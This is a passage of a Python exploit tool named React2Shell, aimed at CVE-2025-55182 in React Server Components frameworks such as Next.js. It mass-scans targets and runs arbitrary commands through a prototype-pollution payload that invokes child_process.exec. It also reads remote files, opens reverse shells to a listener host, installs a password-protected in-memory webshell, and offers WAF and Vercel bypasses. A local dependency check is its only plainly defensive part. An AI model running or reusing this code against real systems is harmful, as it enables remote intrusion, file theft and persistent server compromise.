            return None, f"Connection Error: {e}"
        except requests.exceptions.Timeout:
            return None, "Timeout"
        except Exception as e:
            return None, str(e)

    def get_version(self, url: str, path: str = "/") -> Dict:
        """Detect Next.js/React version from HTTP headers."""
        url = normalize_url(url)
        target = f"{url}{path}"

        result = {
            "url": url,
            "path": path,
            "target": target,
            "nextjs_version": None,
            "server": None,
            "x_powered_by": None,
            "error": None
        }

        try:
            response = requests.get(
                target,
                headers={"User-Agent": self.user_agent},
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=True,
                proxies=self.proxies
            )

            result["server"] = response.headers.get("Server", None)
            result["x_powered_by"] = response.headers.get("X-Powered-By", None)

            # Try to extract Next.js version from response
            if result["x_powered_by"] and "Next.js" in result["x_powered_by"]:
                match = re.search(r'Next\.js\s*([\d.]+)', result["x_powered_by"])
                if match:
                    result["nextjs_version"] = match.group(1)

            # Check for version in HTML meta or script tags
            if not result["nextjs_version"]:
                version_match = re.search(r'/_next/static/[\w-]+/_buildManifest\.js', response.text)
                if version_match:
                    result["nextjs_version"] = "detected (version hidden)"

        except Exception as e:
            result["error"] = str(e)

        return result

    def _parse_output(self, response: requests.Response) -> Tuple[bool, str]:
        """Parse command output from response."""
        redirect_header = response.headers.get("X-Action-Redirect", "")
        if not redirect_header:
            return False, ""

        match = re.search(r'/login\?a=([^;]+)', redirect_header)
        if not match:
            return False, ""

        encoded = unquote(match.group(1))
        try:
            return True, base64.b64decode(encoded).decode('utf-8')
        except (ValueError, UnicodeDecodeError, base64.binascii.Error):
            return True, encoded

    def check(self, url: str, path: str = "/", safe_mode: bool = False,
              waf_bypass: bool = False, waf_size_kb: int = 128,
              vercel_bypass: bool = False, windows: bool = False) -> dict:
        """Check if target is vulnerable."""
        url = normalize_url(url)
        target = f"{url}{path}"

        result = {
            "url": url,
            "path": path,
            "target": target,
            "vulnerable": None,
            "status_code": None,
            "error": None,
            "output": None,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        if safe_mode:
            body, content_type = build_safe_payload()
        else:
            body, content_type, expected = build_check_payload()

        response, error = self._send_request(target, body, content_type)

        if error:
            result["error"] = error
            if error == "Timeout":
                result["vulnerable"] = False  # Patched servers may hang
            return result

        result["status_code"] = response.status_code

        if safe_mode:
            # Side-channel detection
            if response.status_code == 500 and 'E{"digest"' in response.text:
                # Check for mitigations
                server = response.headers.get("Server", "").lower()
                if server not in ("vercel", "netlify") and "Netlify-Vary" not in response.headers:
                    result["vulnerable"] = True
                else:
                    result["vulnerable"] = False
                    result["error"] = "Platform mitigation detected"
            else:
                result["vulnerable"] = False
        else:
            # RCE check via math operation
            redirect = response.headers.get("X-Action-Redirect", "")
            if f"/login?a={expected}" in redirect:
                result["vulnerable"] = True
                result["output"] = expected
            else:
                result["vulnerable"] = False

        return result

    def execute(self, url: str, cmd: str, path: str = "/",
                windows: bool = False, waf_bypass: bool = False,
                waf_size_kb: int = 128, vercel_bypass: bool = False,
                unicode_bypass: bool = False, framework: str = "nextjs") -> Tuple[bool, str, int]:
        """Execute command on vulnerable target."""
        url = normalize_url(url)
        target = f"{url}{path}"

        # Use framework-specific payload builder
        if framework == "waku":
            body, content_type = build_waku_payload(
                cmd, windows=windows, waf_bypass=waf_bypass,
                waf_size_kb=waf_size_kb
            )
        elif framework == "react-router":
            body, content_type = build_react_router_payload(cmd, windows=windows)
        else:
            # Default to Next.js payload (works for most frameworks)
            body, content_type = build_rce_payload(
                cmd, windows=windows, waf_bypass=waf_bypass,
                waf_size_kb=waf_size_kb, vercel_bypass=vercel_bypass,
                unicode_bypass=unicode_bypass
            )

        response, error = self._send_request(target, body, content_type, framework)

        if error:
            return False, error, 0

        success, output = self._parse_output(response)
        return success, output, response.status_code

    def read_file(self, url: str, file_path: str, path: str = "/",
                  windows: bool = False, waf_bypass: bool = False,
                  waf_size_kb: int = 128, vercel_bypass: bool = False,
                  unicode_bypass: bool = False, framework: str = "nextjs") -> Tuple[bool, str, int]:
        """Read a file from the target system."""
        if windows:
            cmd = f"type {file_path}"
        else:
            cmd = f"cat {file_path}"
        return self.execute(url, cmd, path, windows, waf_bypass, waf_size_kb,
                          vercel_bypass, unicode_bypass, framework)

    def reverse_shell(self, url: str, lhost: str, lport: int,
                      shell_type: str = "nc-mkfifo", path: str = "/",
                      windows: bool = False) -> bool:
        """Send reverse shell payload and start listener."""
        print(Colors.info(f"Starting listener on {lhost}:{lport}"))
        server = start_listener(lhost, lport)
        if not server:
            return False

        shell_cmd = get_reverse_shell_cmd(shell_type, lhost, lport)
        print(Colors.info(f"Sending {shell_type} reverse shell payload..."))

        # Send payload in background
        def send_payload():
            time.sleep(1)
            url_normalized = normalize_url(url)
            target = f"{url_normalized}{path}"

            # Build reverse shell payload (fire and forget)
            cmd_escaped = shell_cmd.replace("\\", "\\\\").replace("'", "\\'")
            prefix = (
                f"process.mainModule.require('child_process').exec('{cmd_escaped}',"
                f"{{detached:true,stdio:'ignore'}},function(){{}});"
                f"throw Object.assign(new Error('NEXT_REDIRECT'),"
                f"{{digest: 'NEXT_REDIRECT;push;/login;307;'}});"
            )

            boundary = random_boundary().replace("----", "")
            part0 = (
                '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
                '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
                + prefix + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
            )

            body = "\r\n".join([
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}",
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"",
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]",
                f"--{boundary}--"
            ])

            content_type = f"multipart/form-data; boundary={boundary}"
            self._send_request(target, body, content_type)

        threading.Thread(target=send_payload, daemon=True).start()

        print(Colors.info("Waiting for connection..."))
        try:
            client, addr = server.accept()
            print(Colors.success(f"Connection from {addr[0]}:{addr[1]}"))
            interactive_shell(client)
            return True
        except socket.timeout:
            print(Colors.error("Connection timeout - no shell received"))
            return False
        except Exception as e:
            print(Colors.error(f"Error: {e}"))
            return False
        finally:
            server.close()

    def interactive_shell(self, url: str, path: str = "/",
                         windows: bool = False, waf_bypass: bool = False,
                         waf_size_kb: int = 128, vercel_bypass: bool = False,
                         unicode_bypass: bool = False, framework: str = "nextjs"):
        """Start an interactive command shell."""
        url = normalize_url(url)
        target = f"{url}{path}"

        print(Colors.success(f"Interactive shell on {target}"))
        print(Colors.info("Commands: 'exit' to quit, 'read <file>' to read files"))
        print(Colors.info("          'download <remote> <local>' to download files"))
        print(Colors.info("          'history' to show command history, 'clear' to clear screen"))
        print()

        history = []

        while True:
            try:
                cmd = input(f"{Colors.RED}shell>{Colors.RESET} ").strip()

                if not cmd:
                    continue

                history.append(cmd)

                # Built-in commands
                if cmd.lower() == 'exit':
                    print(Colors.info("Exiting interactive shell..."))
                    break

                elif cmd.lower() == 'history':
                    for i, h in enumerate(history[:-1], 1):
                        print(f"  {i}: {h}")
                    continue

                elif cmd.lower() == 'clear':
                    os.system('clear' if os.name != 'nt' else 'cls')
                    continue

                elif cmd.lower().startswith('read '):
                    file_path = cmd[5:].strip()
                    if file_path:
                        success, output, status = self.read_file(
                            url, file_path, path, windows, waf_bypass,
                            waf_size_kb, vercel_bypass, unicode_bypass
                        )
                        if success:
                            print(output)
                        else:
                            print(Colors.error(f"Failed to read file: {output}"))
                    else:
                        print(Colors.error("Usage: read <file_path>"))
                    continue

                elif cmd.lower().startswith('download '):
                    parts = cmd[9:].strip().split()
                    if len(parts) >= 2:
                        remote_file = parts[0]
                        local_file = parts[1]
                        success, output, status = self.read_file(
                            url, remote_file, path, windows, waf_bypass,
                            waf_size_kb, vercel_bypass, unicode_bypass
                        )
                        if success:
                            try:
                                with open(local_file, 'w') as f:
                                    f.write(output)
                                print(Colors.success(f"Downloaded {remote_file} -> {local_file}"))
                            except Exception as e:
                                print(Colors.error(f"Failed to save file: {e}"))
                        else:
                            print(Colors.error(f"Failed to download: {output}"))
                    else:
                        print(Colors.error("Usage: download <remote_file> <local_file>"))
                    continue

                # Execute command
                success, output, status = self.execute(
                    url, cmd, path, windows, waf_bypass,
                    waf_size_kb, vercel_bypass, unicode_bypass, framework
                )

                if success:
                    print(output)
                else:
                    print(Colors.error(f"Command failed: {output or 'No output'} (Status: {status})"))

            except KeyboardInterrupt:
                print("\n" + Colors.info("Use 'exit' to quit"))
            except EOFError:
                print()
                break


# =============================================================================
# MAIN
# =============================================================================

def scan_targets(scanner: React2Shell, targets: List[str], paths: List[str],
                 threads: int, safe_mode: bool, waf_bypass: bool,
                 waf_size_kb: int, vercel_bypass: bool, windows: bool,
                 verbose: bool, quiet: bool, output_file: str,
                 rate_limit: float = 0.0) -> List[dict]:
    """Scan multiple targets with optional rate limiting."""
    results = []
    vulnerable_count = 0

    # Build all target/path combinations
    tasks = []
    for target in targets:
        for path in paths:
            tasks.append((target, path))

    total = len(tasks)

    if not quiet:
        print(Colors.info(f"Scanning {len(targets)} target(s) with {len(paths)} path(s) ({total} total)"))
        print(Colors.info(f"Threads: {threads}, Timeout: {scanner.timeout}s"))
        if rate_limit > 0:
            print(Colors.info(f"Rate limit: {rate_limit}s delay between requests"))
        if safe_mode:
            print(Colors.info("Mode: Safe side-channel detection"))
        else:
            print(Colors.info("Mode: RCE proof-of-concept"))
        if waf_bypass:
            print(Colors.info(f"WAF bypass enabled ({waf_size_kb}KB padding)"))
        if vercel_bypass:
            print(Colors.info("Vercel WAF bypass enabled"))
        print()

    def check_task(task):
        target, path = task
        result = scanner.check(target, path, safe_mode=safe_mode,
                           waf_bypass=waf_bypass, waf_size_kb=waf_size_kb,
                           vercel_bypass=vercel_bypass, windows=windows)
        # Apply rate limiting if configured
        if rate_limit > 0:
            time.sleep(rate_limit)
        return result

    if threads == 1 or total == 1:
        # Single-threaded
        for i, task in enumerate(tasks):
            result = check_task(task)
            results.append(result)

            if result["vulnerable"]:
                vulnerable_count += 1
                print(Colors.vuln(f"{result['target']}"))
            elif verbose and not quiet:
                if result["error"]:
                    print(Colors.warning(f"{result['target']} - {result['error']}"))
                else:
                    print(Colors.safe(f"{result['target']}"))
    else:
        # Multi-threaded
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_task, task): task for task in tasks}

            if HAS_TQDM and not quiet:
                pbar = tqdm(total=total, desc="Scanning", unit="req", ncols=80)

            for future in as_completed(futures):
                result = future.result()
                results.append(result)

                if result["vulnerable"]:
                    vulnerable_count += 1
                    if HAS_TQDM and not quiet:
                        tqdm.write(Colors.vuln(f"{result['target']}"))
                    else:
                        print(Colors.vuln(f"{result['target']}"))
                elif verbose and not quiet:
                    if result["error"]:
                        msg = Colors.warning(f"{result['target']} - {result['error']}")
                    else:
                        msg = Colors.safe(f"{result['target']}")
                    if HAS_TQDM:
                        tqdm.write(msg)
                    else:
                        print(msg)

                if HAS_TQDM and not quiet:
                    pbar.update(1)

            if HAS_TQDM and not quiet:
                pbar.close()

    # Summary
    if not quiet:
        print()
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"  Total requests: {total}")
        if vulnerable_count > 0:
            print(f"  {Colors.RED}{Colors.BOLD}Vulnerable: {vulnerable_count}{Colors.RESET}")
        else:
            print(f"  Vulnerable: 0")
        print(f"  Not vulnerable: {total - vulnerable_count}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

    # Save results
    if output_file:
        output = {
            "scan_time": datetime.now(timezone.utc).isoformat(),
            "total": total,
            "vulnerable": vulnerable_count,
            "results": results
        }
        with open(output_file, 'w') as f:
            json.dump(output, f, indent=2)
        print(Colors.success(f"Results saved to {output_file}"))

    return results


def main():
    parser = argparse.ArgumentParser(
        description="React2Shell - CVE-2025-55182 Scanner & Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Check single URL (safe mode - default)
  %(prog)s https://target.com

  # Scan list of URLs (safe detection, no code execution)
  %(prog)s targets.txt

  # RCE proof-of-concept (requires explicit opt-in)
  %(prog)s https://target.com --rce

  # Execute command (authorized testing only)
  %(prog)s https://target.com -c "id"

  # Interactive shell
  %(prog)s https://target.com -i

  # Reverse shell
  %(prog)s https://target.com -r -l 10.0.0.1 -p 4444

  # Custom paths
  %(prog)s https://target.com -P /api,/_next

  # WAF bypass (junk data + unicode)
  %(prog)s https://target.com -w -u --rce

  # Scan local project for vulnerable versions
  %(prog)s --local /path/to/project

  # Use proxy (e.g., Burp Suite)
  %(prog)s https://target.com -x http://127.0.0.1:8080
        """
    )

    # Target (positional - auto-detects URL vs file)
    parser.add_argument(
        "target",
        nargs="?",
        help="URL or file containing URLs (auto-detected)"
    )

    # Execution options
    exec_group = parser.add_argument_group("Execution Options")
    exec_group.add_argument(
        "-c", "--cmd",
        help="Command to execute on vulnerable target"
    )
    exec_group.add_argument(
        "-i", "--interactive",
        action="store_true",
        help="Start interactive shell session"
    )
    exec_group.add_argument(
        "-r", "--reverse",
        action="store_true",
        help="Enable reverse shell mode"
    )
    exec_group.add_argument(
        "-l", "--lhost",
        help="Listener host for reverse shell"
    )
    exec_group.add_argument(
        "-p", "--lport",
        type=int,
        help="Listener port for reverse shell"
    )
    exec_group.add_argument(
        "-S", "--shell-type",
        choices=list(REVERSE_SHELLS.keys()),
        default="nc-mkfifo",
        help="Reverse shell type (default: nc-mkfifo)"
    )
    exec_group.add_argument(
        "-f", "--read-file",
        metavar="FILE",
        help="Read a file from the target"
    )

    # Scanning options
    scan_group = parser.add_argument_group("Scanning Options")
    scan_group.add_argument(
        "-P", "--path",
        default="/",
        help="Path(s) to test - comma-separated or file (default: /)"
    )
    scan_group.add_argument(
        "-t", "--threads",
        type=int,
        default=10,
        help="Number of threads (default: 10)"
    )
    scan_group.add_argument(
        "-T", "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    scan_group.add_argument(
        "-s", "--safe",
        action="store_true",
        default=True,
        help="Safe mode - side-channel detection without code execution (default)"
    )
    scan_group.add_argument(
        "--rce", "--poc",
        action="store_true",
        dest="rce_mode",
        help="RCE proof-of-concept mode - executes code on target (use with authorization)"
    )
    scan_group.add_argument(
        "-L", "--local",
        metavar="PATH",
        help="Scan local project directory for vulnerable versions"
    )
    scan_group.add_argument(
        "-F", "--framework",
        choices=["auto", "nextjs", "react-router", "waku", "expo", "vite-rsc", "parcel-rsc", "redwood"],
        default="auto",
        help="Target framework (default: auto-detect)"
    )
    scan_group.add_argument(
        "-E", "--enumerate",
        action="store_true",
        help="Enumerate RSC endpoints before exploitation"
    )
    scan_group.add_argument(
        "--detect",
        action="store_true",
        help="Only detect framework and list suggested endpoints"
    )
    scan_group.add_argument(
        "--webshell",
        metavar="PASSWORD",
        nargs="?",
        const="react2shell",
        help="Install in-memory webshell on port 1337 (default password: react2shell)"
    )
    scan_group.add_argument(
        "--rate-limit",
        type=float,
        default=0,
        metavar="DELAY",
        help="Rate limit: delay in seconds between requests (default: 0 = no limit)"
    )

    # Bypass options
    bypass_group = parser.add_argument_group("Bypass Options")
    bypass_group.add_argument(
        "-w", "--waf-bypass",
        action="store_true",
        help="Enable WAF bypass (junk data padding)"
    )
    bypass_group.add_argument(
        "-W", "--waf-size",
        type=int,
        default=128,
        help="WAF bypass junk size in KB (default: 128)"
    )
    bypass_group.add_argument(
        "-u", "--unicode",
        action="store_true",
        help="Enable Unicode encoding WAF bypass"
    )
    bypass_group.add_argument(
        "-V", "--vercel-bypass",
        action="store_true",
        help="Use Vercel-specific WAF bypass"
    )
    bypass_group.add_argument(
        "--windows",
        action="store_true",
        help="Use Windows PowerShell payloads"
    )

    # Request options
    req_group = parser.add_argument_group("Request Options")
    req_group.add_argument(
        "-x", "--proxy",
        help="Proxy URL (e.g., http://127.0.0.1:8080)"
    )
    req_group.add_argument(
        "-H", "--header",
        action="append",
        dest="headers",
        metavar="HEADER",
        help="Custom header (Key: Value) - can be used multiple times"
    )
    req_group.add_argument(
        "-A", "--user-agent",
        help="Custom User-Agent"
    )
    req_group.add_argument(
        "-k", "--insecure",
        action="store_true",
        default=True,
        help="Disable SSL verification (default: disabled)"
    )

    # Output options
    output_group = parser.add_argument_group("Output Options")
    output_group.add_argument(
        "-o", "--output",
        help="Save results to JSON file"
    )
    output_group.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output (includes version detection)"
    )
    output_group.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Quiet mode - only show vulnerable targets"
    )
    output_group.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )
    output_group.add_argument(
        "--no-banner",
        action="store_true",
        help="Don't show banner"
    )

    args = parser.parse_args()

    # Handle colors
    if args.no_color or not sys.stdout.isatty():
        disable_colors()

    # Show banner
    if not args.no_banner and not args.quiet:
        print(BANNER)

    # Local project scanning mode (doesn't need target)
    if args.local:
        print(Colors.info(f"Scanning local project: {args.local}"))
        results = scan_local_project(args.local)

        vulnerable_found = False
        for result in results:
            if "error" in result:
                print(Colors.error(f"Error: {result['error']}"))
                continue

            print(Colors.info(f"File: {result['file']}"))
            for pkg in result.get("packages", []):
                if pkg["vulnerable"]:
                    vulnerable_found = True
                    print(Colors.vuln(f"  {pkg['name']}@{pkg['version']} -> upgrade to {pkg['patched_version']}"))
                else:
                    print(Colors.safe(f"  {pkg['name']}@{pkg['version']}"))

        if not results:
            print(Colors.warning("No package files found"))

        sys.exit(1 if vulnerable_found else 0)

    # Require target for all other modes
    if not args.target:
        print(Colors.error("Target required (URL or file). Use --local for local project scanning."))
        parser.print_help()
        sys.exit(1)

    # Parse custom headers
    custom_headers = {}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                key, value = h.split(':', 1)
                custom_headers[key.strip()] = value.strip()

    # Create scanner
    scanner = React2Shell(
        timeout=args.timeout,
        verify_ssl=not args.insecure,
        user_agent=args.user_agent,
        headers=custom_headers,
        proxy=args.proxy
    )

    # Load targets
    targets = load_targets(args.target)
    if not targets:
        print(Colors.error("No targets specified"))
        sys.exit(1)

    # Load paths
    paths = load_paths(args.path) if args.path else ["/"]

    # Show proxy info if used
    if args.proxy and not args.quiet:
        print(Colors.info(f"Using proxy: {args.proxy}"))

    # Version detection in verbose mode
    if args.verbose and not args.quiet:
        for target in targets[:3]:  # Limit to first 3 targets for version check
            version_info = scanner.get_version(target, paths[0])
            if version_info.get("nextjs_version"):
                print(Colors.info(f"Detected Next.js version on {target}: {version_info['nextjs_version']}"))
            if version_info.get("server"):
                print(Colors.info(f"Server: {version_info['server']}"))

    # Framework detection mode
    if args.detect:
        for target in targets:
            print(Colors.info(f"Detecting framework on {target}..."))
            framework, suggested_paths = detect_framework(target, timeout=args.timeout)
            print(Colors.success(f"Detected framework: {FRAMEWORK_ENDPOINTS.get(framework, {}).get('name', 'Unknown')}"))
            print(Colors.info(f"Suggested endpoints to test:"))
            for p in suggested_paths[:15]:  # Show top 15
                print(f"  {p}")
        sys.exit(0)

    # Auto-detect framework and adjust paths
    # Store detected framework for use in command execution
    detected_framework = args.framework
    if args.framework == "auto" and len(targets) == 1:
        framework, suggested_paths = detect_framework(targets[0], timeout=args.timeout)
        if framework != "unknown":
            detected_framework = framework
            if not args.quiet:
                print(Colors.info(f"Auto-detected framework: {FRAMEWORK_ENDPOINTS.get(framework, {}).get('name', framework)}"))
        if args.path == "/" and suggested_paths:
            paths = suggested_paths[:10]  # Use suggested paths if default
    elif args.framework != "auto":
        detected_framework = args.framework
        # Use framework-specific paths
        fw_config = FRAMEWORK_ENDPOINTS.get(args.framework, {})
        if fw_config and args.path == "/":
            paths = fw_config.get("paths", []) + ["/"]
            if not args.quiet:
                print(Colors.info(f"Using {fw_config.get('name', args.framework)} paths"))

    # Endpoint enumeration mode
    if args.enumerate:
        for target in targets:
            print(Colors.info(f"Enumerating RSC endpoints on {target}..."))
            endpoints = enumerate_rsc_endpoints(
                target, paths=RSC_ENDPOINT_WORDLIST,
                timeout=args.timeout, threads=args.threads,
                verbose=args.verbose
            )
            if endpoints:
                print(Colors.success(f"Found {len(endpoints)} potential endpoints:"))
                for ep in endpoints:
                    marker = Colors.RED + "[RSC]" + Colors.RESET if ep["likely_rsc"] else "[OK]"
                    print(f"  {marker} {ep['path']} (Status: {ep['status']})")
                # Update paths with discovered RSC endpoints
                rsc_paths = [ep["path"] for ep in endpoints if ep["likely_rsc"]]
                if rsc_paths:
                    paths = rsc_paths
                    print(Colors.info(f"Using {len(rsc_paths)} discovered RSC endpoints for scanning"))
            else:
                print(Colors.warning("No RSC endpoints found"))
        if not args.cmd and not args.interactive:
            sys.exit(0)

    # Webshell installation mode
    if args.webshell:
        password = args.webshell
        webshell_port = 1337
        print(Colors.info(f"Installing in-memory webshell on port {webshell_port} (password: {password})..."))
        for target in targets:
            for path in paths:
                body, content_type = build_webshell_payload(password)
                headers = scanner._build_headers(content_type)
                try:
                    response = requests.post(
                        f"{normalize_url(target)}{path}",
                        headers=headers,
                        data=body.encode('utf-8'),
                        timeout=scanner.timeout,
                        verify=scanner.verify_ssl,
                        allow_redirects=False,
                        proxies=scanner.proxies
                    )
                    if response.status_code in [303, 307] or "shell-installed" in response.headers.get("X-Action-Redirect", ""):
                        # Extract host from target URL for webshell access
                        parsed = urlparse(target)
                        webshell_host = parsed.hostname
                        print(Colors.success(f"Webshell installed on {target}"))
                        print(Colors.info(f"Access via: curl 'http://{webshell_host}:{webshell_port}/?p={password}&cmd=id'"))
                    else:
                        print(Colors.error(f"Failed to install webshell on {target} (Status: {response.status_code})"))
                except Exception as e:
                    print(Colors.error(f"Error: {e}"))
        sys.exit(0)

    # Interactive shell mode
    if args.interactive:
        if len(targets) > 1:
            print(Colors.warning("Interactive mode only supports single target, using first"))

        scanner.interactive_shell(
            targets[0], path=paths[0],
            windows=args.windows,
            waf_bypass=args.waf_bypass,
            waf_size_kb=args.waf_size,
            vercel_bypass=args.vercel_bypass,
            unicode_bypass=args.unicode,
            framework=detected_framework if detected_framework != "auto" else "nextjs"
        )
        sys.exit(0)

    # Reverse shell mode
    if args.reverse:
        if not args.lhost or not args.lport:
            print(Colors.error("-l/--lhost and -p/--lport required for reverse shell"))
            sys.exit(1)

        # Validate lhost is a valid IP address or hostname
        try:
            # Try parsing as IP address first
            ipaddress.ip_address(args.lhost)
        except ValueError:
            # Not an IP, check if it looks like a valid hostname
            if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$', args.lhost):
                print(Colors.error(f"Invalid listener host: {args.lhost}"))
                print(Colors.info("Please provide a valid IP address or hostname"))
                sys.exit(1)

        # Validate port is in valid range
        if not (1 <= args.lport <= 65535):
            print(Colors.error(f"Invalid port: {args.lport} (must be 1-65535)"))
            sys.exit(1)

        if len(targets) > 1:
            print(Colors.error("Reverse shell only supports single target"))
            sys.exit(1)

        scanner.reverse_shell(
            targets[0], args.lhost, args.lport,
            shell_type=args.shell_type,
            path=paths[0],
            windows=args.windows
        )
        sys.exit(0)

    # Read file mode
    if args.read_file:
        for target in targets:
            for path in paths:
                print(Colors.info(f"Reading {args.read_file} from {target}{path}"))
                success, output, status = scanner.read_file(
                    target, args.read_file, path=path,
                    windows=args.windows,
                    waf_bypass=args.waf_bypass,
                    waf_size_kb=args.waf_size,
                    vercel_bypass=args.vercel_bypass,
                    unicode_bypass=args.unicode,
                    framework=detected_framework if detected_framework != "auto" else "nextjs"
                )

                if success:
                    print(Colors.success(f"File read successfully"))
                    print(f"\n{output}\n")
                else:
                    print(Colors.error(f"Failed: {output or 'No output'} (Status: {status})"))
        sys.exit(0)

    # Command execution mode
    if args.cmd:
        if len(targets) > 1:
            print(Colors.warning("Command execution on multiple targets..."))

        for target in targets:
            for path in paths:
                print(Colors.info(f"Executing on {target}{path}"))
                success, output, status = scanner.execute(
                    target, args.cmd, path=path,
                    windows=args.windows,
                    waf_bypass=args.waf_bypass,
                    waf_size_kb=args.waf_size,
                    vercel_bypass=args.vercel_bypass,
                    unicode_bypass=args.unicode,
                    framework=detected_framework if detected_framework != "auto" else "nextjs"
                )

                if success:
                    print(Colors.success(f"Command executed successfully"))
                    print(f"\n{output}\n")
                else:
                    print(Colors.error(f"Failed: {output or 'No output'} (Status: {status})"))
        sys.exit(0)

    # Scan mode (default)
    # Safe mode is default unless --rce is explicitly specified
    use_safe_mode = not args.rce_mode
    results = scan_targets(
        scanner, targets, paths,
        threads=args.threads,
        safe_mode=use_safe_mode,
        waf_bypass=args.waf_bypass,
        waf_size_kb=args.waf_size,
        vercel_bypass=args.vercel_bypass,
        windows=args.windows,
        verbose=args.verbose,
        quiet=args.quiet,
        output_file=args.output,
        rate_limit=args.rate_limit
    )

    # Exit code based on findings
    vulnerable = any(r.get("vulnerable") for r in results)
    sys.exit(1 if vulnerable else 0)


if __name__ == "__main__":
    main()
